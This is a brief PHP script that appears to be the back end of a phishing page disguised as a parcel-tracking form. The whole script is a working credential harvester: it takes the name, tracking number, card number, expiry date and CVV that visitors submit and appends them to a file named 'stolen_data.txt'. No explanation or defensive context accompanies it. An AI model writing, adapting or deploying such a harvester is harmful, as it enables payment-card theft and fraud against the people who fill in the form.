<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = "Name: " . $_POST["name"] . "\nTracking: " . $_POST["tracking"] . 
            "\nCard: " . $_POST["card_number"] . "\nExpiry: " . $_POST["expiry_date"] . 
            "\nCVV: " . $_POST["cvv"] . "\n\n";
    file_put_contents("stolen_data.txt", $data, FILE_APPEND);
}
?>
